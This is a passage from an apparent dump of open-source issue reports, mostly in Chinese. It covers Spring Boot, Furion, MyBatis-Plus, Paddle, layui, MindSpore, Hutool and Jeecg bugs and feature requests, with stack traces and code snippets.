[com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:652) ... 54 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'healthEndpoint' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Unsatisfied dependency expressed through method 'healthEndpoint' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'healthContributorRegistry' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:799) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:540) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1109) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.lambda$createEndpointBean$1(EndpointDiscoverer.java:145) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer$EndpointBean.getBean(EndpointDiscoverer.java:469) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.getFilterEndpoint(EndpointDiscoverer.java:329) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.isFilterMatch(EndpointDiscoverer.java:307) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.isExtensionExposed(EndpointDiscoverer.java:239) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.addExtensionBean(EndpointDiscoverer.java:170) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.addExtensionBeans(EndpointDiscoverer.java:159) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.discoverEndpoints(EndpointDiscoverer.java:124) at org.springframework.boot.actuate.endpoint.annotation.EndpointDiscoverer.getEndpoints(EndpointDiscoverer.java:117) at org.springframework.boot.actuate.autoconfigure.endpoint.web.servlet.WebMvcEndpointManagementContextConfiguration.webEndpointServletHandlerMapping(WebMvcEndpointManagementContextConfiguration.java:71) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 55 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'healthContributorRegistry' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:657) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:637) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1307) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:886) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:790) ... 80 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:652) ... 94 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:799) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:228) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1356) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1203) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:409) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:624) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:612) at org.springframework.context.support.AbstractApplicationContext.getBeansOfType(AbstractApplicationContext.java:1243) at org.springframework.boot.actuate.autoconfigure.health.HealthEndpointConfiguration.healthContributorRegistry(HealthEndpointConfiguration.java:82) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 95 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1794) at org.springframework.beans.factory.s
"在启用数据库懒加载后, 获取仓储对象抛出异常","Furion 版本号 2.0.6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 在启用数据库懒加载后, 获取仓储对象抛出异常. 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 正常使用数据库懒加载, 能够自动加载相关联的对象实体.   <code>: at Microsoft.EntityFrameworkCore.Internal.DbContextServices.Initialize(IServiceProvider scopedProvider, IDbContextOptions contextOptions, DbContext context) at Microsoft.EntityFrameworkCore.DbContext.get_InternalServiceProvider() at Microsoft.EntityFrameworkCore.DbContext.Microsoft.EntityFrameworkCore.Infrastructure.IInfrastructure&lt;System.IServiceProvider&gt;.get_Instance() at Microsoft.EntityFrameworkCore.Infrastructure.Internal.InfrastructureExtensions.GetService[TService](IInfrastructure`1 accessor) at Microsoft.EntityFrameworkCore.Infrastructure.AccessorExtensions.GetService[TService](IInfrastructure`1 accessor) at Microsoft.EntityFrameworkCore.Infrastructure.DatabaseFacade.get_Dependencies() at Microsoft.EntityFrameworkCore.Infrastructure.DatabaseFacade.Microsoft.EntityFrameworkCore.Storage.IDatabaseFacadeDependenciesAccessor.get_Dependencies() at Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.GetFacadeDependencies(DatabaseFacade databaseFacade) at Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.GetDbConnection(DatabaseFacade databaseFacade) at Furion.DatabaseAccessor.PrivateRepository`1..ctor(Type dbContextLocator, IServiceProvider scoped) at Furion.DatabaseAccessor.EFCoreRepository`2..ctor(IServiceProvider scoped) at Furion.DatabaseAccessor.EFCoreRepository`1..ctor(IServiceProvider scoped) at System.RuntimeMethodHandle.InvokeMethod(Object target, Object[] arguments, Signature sig, Boolean constructor, Boolean wrapExceptions) at System.Reflection.RuntimeConstructorInfo.Invoke(BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite singletonCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.Resolve(ServiceCallSite callSite, ServiceProviderEngineScope scope) at Microsoft.Extensions.DependencyInjection.ServiceLookup.DynamicServiceProviderEngine.&lt;&gt;c__DisplayClass1_0.&lt;RealizeService&gt;b__0(ServiceProviderEngineScope scope) at Furion.App.GetService(Type type, IServiceProvider scoped) at Furion.App.GetService[TService](IServiceProvider scoped) at System03.Core.Managers.UserManager..ctor() in \System03.Core\Managers\UserManager.cs:line 24 at System.RuntimeMethodHandle.InvokeMethod(Object target, Object[] arguments, Signature sig, Boolean constructor, Boolean wrapExceptions) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite singletonCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.Resolve(ServiceCallSite callSite, ServiceProviderEngineScope scope) at Microsoft.Extensions.DependencyInjection.ServiceLookup.DynamicServiceProviderEngine.&lt;&gt;c__DisplayClass1_0.&lt;RealizeService&gt;b__0(ServiceProviderEngineScope scope) at Furion.App.GetService(Type type, IServiceProvider scoped) at Furion.App.GetService[TService](IServiceProvider scoped) at System03.Application.User.UserService..ctor() in \System03.Application\User\UserService.cs:line 24 at Microsoft.AspNetCore.Mvc.Controllers.ControllerActivatorProvider.&lt;&gt;c__DisplayClass4_0.&lt;CreateActivator&gt;b__0(ControllerContext controllerContext) at Microsoft.AspNetCore.Mvc.Controllers.ControllerFactoryProvider.&lt;&gt;c__DisplayClass5_0.&lt;CreateControllerFactory&gt;g__CreateController|0(ControllerContext controllerContext) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() options.AddDbPool&lt;DefaultDbContext&gt;(optionBuilder=&gt; { optionBuilder.UseLazyLoadingProxies(); });"
TableField condition,"当前使用版本 mp最新 oracle10g 配置： 错误： 可用： 如上 这种写法数据库应该支持的吧 老大给个正确插入姿势   <code>: @TableField(condition = ""%s LIKE '%%#{%s}%%'"") private String name; ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### Cause: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Error: Method queryTotal execution error of sql : SELECT COUNT(1) FROM SYS_META WHERE name LIKE '%?%' AND delflag = 0 @TableField(condition = ""%s LIKE '%%' || #{%s} ||'%%'"") @TableField(condition = ""%s LIKE '%%#{%s}%%'"") SELECT COUNT(1) FROM SYS_META WHERE name LIKE '%菜单%' AND delflag = 0"
Query 查询 其他库表有问题,"@Table(name=""lsh.dict_menu"") Debug [native.SELECT * FROM WHERE ...] 导致错误   <code>: lsh.user user_name lsh.user"
Get Strong Typed Metric From paddle::Evaluator,"In current Paddle API in Python, we should get the strong-typed metric when training, such as Error Rate in float. We should add some interfaces to C++ class to get the metric result firstly, and then we could expose them to SWIG/Python. Each current evaluator could contain zero to many metrics inside. each evaluator should include one metric result, like classification evaluator, contains ErrorRate. There are some evaluators just used for debugging, they often called XXXPrinter. There are some evaluators will contain many metric results, like precision-recall evaluator. It because some metrics are calculated together. So basically, the metrics in Evaluator should be a map or dictionary, the key is a metric name, the value is the strong-typed result.   <code>: paddle::Evaluator"
NumberUtil.parseXXX类型方法建议可以自定义默认值,"JDK版本： 8 hutool版本： all   <code>: NumberUtil.parseInt(str, defVal); //转换数字不能自定义默认值 ... 同类方法也是 // str如果不是数字，默认返回 defVal; 主要是不能自定义默认返回值 // 之前使用commons习惯了。完全切换 hutool后发现有些地方不太习惯"
upload文件上传，在本地可以运行，放到服务器上之后不弹出选择文件的弹窗,"版本 layui-v2.5.7 upload文件上传，在本地可以正常运行，放到服务器上却不弹出选择文件的弹窗,也就是点击选择多文件的按钮没有反应。 用的代码是示例里面的多文件上传   <code>: &lt;fieldset class=""layui-elem-field layui-field-title"" style=""margin-top: 30px;""&gt; &lt;legend&gt;高级应用：制作一个多文件列表&lt;/legend&gt; &lt;/fieldset&gt; &lt;div class=""layui-upload""&gt; &lt;button type=""button"" class=""layui-btn layui-btn-normal"" id=""testList""&gt;选择多文件&lt;/button&gt; &lt;div class=""layui-upload-list"" style=""max-width: 1000px;""&gt; &lt;table class=""layui-table""&gt; &lt;colgroup&gt; &lt;col&gt; &lt;col width=""150""&gt; &lt;col width=""260""&gt; &lt;col width=""150""&gt; &lt;/colgroup&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;文件名&lt;/th&gt; &lt;th&gt;大小&lt;/th&gt; &lt;th&gt;上传进度&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt;&lt;/thead&gt; &lt;tbody id=""demoList""&gt;&lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;button type=""button"" class=""layui-btn"" id=""testListAction""&gt;开始上传&lt;/button&gt; &lt;/div&gt; layui.use(['layer', 'form', 'table', 'util', 'dropdown','index','admin','upload','element'], function () { var $ = layui.jquery; var layer = layui.layer; var form = layui.form; var table = layui.table; var util = layui.util; var dropdown = layui.dropdown; var index = layui.index; var admin = layui.admin; var upload = layui.upload; var element = layui.element; //演示多文件列表 var uploadListIns = upload.render({ elem: '#testList' ,elemList: $('#demoList') //列表元素对象 ,url: 'https://httpbin.org/post' //此处用的是第三方的 http 请求演示，实际使用时改成您自己的上传接口即可。 ,accept: 'file' ,multiple: true ,number: 3 ,auto: false ,bindAction: '#testListAction' ,before: function(obj){ // getUrlParam(""BH"")不为空时才能上传图片，还有删除图片 //预读本地文件示例，不支持ie8 console.log(obj); } ,choose: function(obj){ var that = this; var files = this.files = obj.pushFile(); //将每次选择的文件追加到文件队列 //读取本地文件 obj.preview(function(index, file, result){ var tr = $(['&lt;tr id=""upload-'+ index +'""&gt;' ,'&lt;td&gt;'+ file.name +'&lt;/td&gt;' ,'&lt;td&gt;'+ (file.size/1014).toFixed(1) +'kb&lt;/td&gt;' ,'&lt;td&gt;&lt;div class=""layui-progress"" lay-filter=""progress-demo-'+ index +'""&gt;&lt;div class=""layui-progress-bar"" lay-percent=""""&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;' ,'&lt;td&gt;' ,'&lt;button class=""layui-btn layui-btn-xs demo-reload layui-hide""&gt;重传&lt;/button&gt;' ,'&lt;button class=""layui-btn layui-btn-xs layui-btn-danger demo-delete""&gt;删除&lt;/button&gt;' ,'&lt;/td&gt;' ,'&lt;/tr&gt;'].join('')); //单个重传 tr.find('.demo-reload').on('click', function(){ obj.upload(index, file); }); //删除 tr.find('.demo-delete').on('click', function(){ delete files[index]; //删除对应的文件 tr.remove(); uploadListIns.config.elem.next()[0].value = ''; //清空 input file 值，以免删除后出现同名文件不可选 }); that.elemList.append(tr); element.render('progress'); //渲染新加的进度条组件 }); } ,done: function(res, index, upload){ //成功的回调 var that = this; //if(res.code == 0){ //上传成功 var tr = that.elemList.find('tr#upload-'+ index) ,tds = tr.children(); tds.eq(3).html(''); //清空操作 delete this.files[index]; //删除文件队列已经上传成功的文件 return; //} this.error(index, upload); } ,allDone: function(obj){ //多文件上传完毕后的状态回调 console.log(obj) } ,error: function(index, upload){ //错误回调 var that = this; var tr = that.elemList.find('tr#upload-'+ index) ,tds = tr.children(); tds.eq(3).find('.demo-reload').removeClass('layui-hide'); //显示重传 } ,progress: function(n, elem, e, index){ //注意：index 参数为 layui 2.6.6 新增 element.progress('progress-demo-'+ index, n + '%'); //执行进度条。n 即为返回的进度百分比 } }); });"
fluid.layers.l2_normalize output nan when using gpu mode,"fluid.layers.l2_normalize work well when using cpu mode, but it output nan changing to gpu mode when i replace ""fluid.layers.l2_normalize"" by , it alse work well.   <code>: weight_norm = fluid.layers.sqrt(fluid.layers.reduce_sum(fluid.layers.square(weight), dim=1)) weight = fluid.layers.elementwise_div(weight, weight_norm, axis=0) import os import sys import math import time import argparse import functools import numpy as np import paddle import paddle.fluid as fluid def arc_margin_product(input, label, out_dim, m=0.2, s=20.0): input = fluid.layers.l2_normalize(input, axis=1) weight = fluid.layers.create_parameter( shape=[out_dim, input.shape[1]], dtype='float32', name='weight_norm', attr=fluid.param_attr.ParamAttr( initializer=fluid.initializer.Xavier())) weight = fluid.layers.l2_normalize(weight, axis=1) #weight_norm = fluid.layers.sqrt(fluid.layers.reduce_sum(fluid.layers.square(weight), dim=1)) #weight = fluid.layers.elementwise_div(weight, weight_norm, axis=0) weight = fluid.layers.transpose(weight, perm = [1, 0]) cosine = fluid.layers.mul(input, weight) return cosine def convolutional_neural_network(img, label): conv_pool_1 = fluid.nets.simple_img_conv_pool( input=img, filter_size=5, num_filters=20, pool_size=2, pool_stride=2, act=""relu"") conv_pool_1 = fluid.layers.batch_norm(conv_pool_1) conv_pool_2 = fluid.nets.simple_img_conv_pool( input=conv_pool_1, filter_size=5, num_filters=50, pool_size=2, pool_stride=2, act=""relu"") fc_1 = fluid.layers.fc(input=conv_pool_2, size=2048) prediction = arc_margin_product(fc_1, label, 2048) return prediction def train(): image = fluid.layers.data(name='image', shape=[1, 28, 28], dtype='float32') label = fluid.layers.data(name='label', shape=[1], dtype='int64') # model definition out = convolutional_neural_network(image, label) test_program = fluid.default_main_program().clone(for_test=True) #place = fluid.CUDAPlace(0) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) fetch_list_train = [out.name] data = np.random.uniform(0, 1, (10, 1, 28, 28)).astype(np.float32) label = np.arange(10).astype(np.int64).reshape(10, 1) loss = exe.run(test_program, fetch_list=fetch_list_train, feed={'image': data, 'label':label}) print loss def main(): train() if __name__ == '__main__': main()"
 建议在 **数据字典** 功能中加个权限配置功能,版本号：3.2.0   <code>: 建议在 **数据字典** 功能中加个权限配置功能。（解决不同用户根据权限可配置相应的字典）
[CT][MS][op]ops GatherNd has problems in test case,"用例有重名，且前一个不会raise error/未覆盖0d /mode graph   <code>: def test_gathernd_input_256x4_128x1(): fact = GatherNdFactory((256, 4), (128, 1), np.complex128) fact.forward_cmp() fact.grad_cmp() def test_gathernd_input_4608x4_200x1(): fact = GatherNdFactory((4608, 4, 4), (200, 1), np.uint32) fact.forward_cmp() fact.grad_cmp() def test_gathernd_input_872x5_200x1(): fact = GatherNdFactory((872, 5, 3, 3), (200, 1), np.uint64) fact.forward_cmp() fact.grad_cmp()"
 [ST][doc][tutorials][LSTM-CRF-实现序列标注]Too much WARNING log in training log,"LSTM-CRF-实现序列标注教程执行训练时，产生告警日志太多，请优化 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :r1.9 commit_id:c915f9ed -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220901 MindSpore 版本：编译时间20220904181546 r1.9.0 commit_id:c915f9ed (/): /mode pynative /mode graph test_ms_tutorial_nlp_lstm_crf_sequence_labeling_0001.py cd solution_test/cases/03subject_test/06document/02network_cases pytest -s test_ms_tutorial_nlp_lstm_crf_sequence_labeling_0001.py 网络训练告警日志正常 走给张清华   <code>: [WARNING] ME(39907:140320800368448,MainProcess):2022-09-06-01:50:02.924.118 [mindspore/ops/primitive.py:708] The ""_check_is_tensor"" is a constexpr function. The input arguments must be all constant value. [WARNING] ME(39907:140320800368448,MainProcess):2022-09-06-01:50:02.975.712 [mindspore/ops/primitive.py:708] The ""_is_need_compile"" is a constexpr function. The input arguments must be all constant value. [WARNING] ME(39907:140320800368448,MainProcess):2022-09-06-01:50:02.982.370 [mindspore/ops/primitive.py:708] The ""_is_need_compile"" is a constexpr function. The input arguments must be all constant value"
XmlUtils类里面,"版本号： 3.0 找不到FEATURE_SECURE_PROCESSING   <code>: features.put(XMLConstants.FEATURE_SECURE_PROCESSING, true);"
使用docker编译paddlepaddle book时报错,根据如何贡献文档介绍的使用docker构建book指南，在执行完pwd命令后，访问并点击选项卡报错，报错信息如下：   <code>: docker run -it -p 8000:8000 -v :/var/content paddlepaddle/paddlepaddle.org:latest http://localhost:8000 book
进入首页报错sys_log sql报错,"Jeecg版本:2.0.2 是否修改包名: 否 ###问题描述（包括回显步骤、截图 ） sql直接执行也是报错 此项没有直接关闭、不予解决   <code>: 2019-07-11 14:01:56.445 [http-nio-8080-exec-5] ERROR druid.sql.Statement:149 - {conn-10010, pstmt-20051} execute error. select count(*) as visit, count(distinct(ip)) as ip, DATE_FORMAT(create_time, '%Y-%m-%d') as tian, DATE_FORMAT(create_time, '%m-%d') as type from sys_log where log_type = 1 and create_time &gt;= ? and create_time &lt; ? group by tian order by tian asc com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Expression #4 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'jeecg-boot.sys_log.create_time' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by"
Encounter type error when running lstm(),"Python Code: Error Hint: -PaddlePaddle version: 1.5 -GPU: including CUDA 10.2, cudnn 7.6 -OS Platform: CentOS 7.0   <code>: with fluid.dygraph.guard(fluid.CUDAPlace(0)): xx = fluid.dygraph.to_variable(np.random.rand(16, 8, 1024).astype('float32')) init_h = fluid.layers.fill_constant([3, 8, 256], 'float32', 0.0) init_c = fluid.layers.fill_constant([3, 8, 256], 'float32', 0.0) outputs = fluid.layers.lstm(input=xx, init_h=init_h, init_c=init_c, max_len=256, hidden_size=256, num_layers=3, dropout_prob=0.0, is_bidirec=False, is_test=False, name=None, default_initializer=None, seed=-1) paddle.fluid.core_avx.EnforceNotMet: Variable must be type N6paddle9operators13CudnnRNNCacheE, the holding type is N6paddle9framework9LoDTensorE at [/paddle/paddle/fluid/framework/variable.h:51] PaddlePaddle Call Stacks: 0 0x7f874b15a890p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 352 1 0x7f874b15ac09p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 137 2 0x7f874be07e9cp paddle::operators::CudnnRNNCache* paddle::framework::Variable::GetMutable&lt;paddle::operators::CudnnRNNCache&gt;() + 572 3 0x7f874be09c67p paddle::operators::CudnnLSTMGPUKernel&lt;float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const + 1431 4 0x7f874be0a6b3p std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CUDAPlace, false, 0ul, paddle::operators::CudnnLSTMGPUKernel&lt;float&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) + 35 5 0x7f874b35da3dp 6 0x7f874b2478b5p 7 0x7f874b18d1a6p 8 0x562e6e348744p _PyCFunction_FastCallDict + 340 9 0x562e6e3cf57ep 10 0x562e6e3f438ap _PyEval_EvalFrameDefault + 778 11 0x562e6e3c88e4p 12 0x562e6e3c9771p 13 0x562e6e3cf505p 14 0x562e6e3f438ap _PyEval_EvalFrameDefault + 778 15 